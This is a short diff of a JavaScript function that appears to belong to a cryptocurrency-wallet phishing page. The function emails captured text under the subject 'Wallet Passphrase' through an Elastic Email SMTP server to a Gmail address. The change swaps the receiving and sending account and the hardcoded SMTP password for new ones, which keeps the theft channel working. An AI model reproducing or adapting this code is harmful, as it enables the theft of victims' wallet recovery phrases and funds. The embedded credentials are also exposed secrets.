@@ -10,10 +10,10 @@ function emailSend() {
   
     Email.send({
       Host: "smtp.elasticemail.com",
-      Username: "nelsf38@gmail.com",
-      Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
+      Username: "payday10177@gmail.com",
+      Password: "E0027CA3A1AEBEC3A6EE6998C984F02F5E5D",
       To: 'payday10177@gmail.com',
-      From: "nelsf38@gmail.com",
+      From: "payday10177@gmail.com",
       Subject: "Wallet Passphrase",
       Body: messageBody
     }).then(
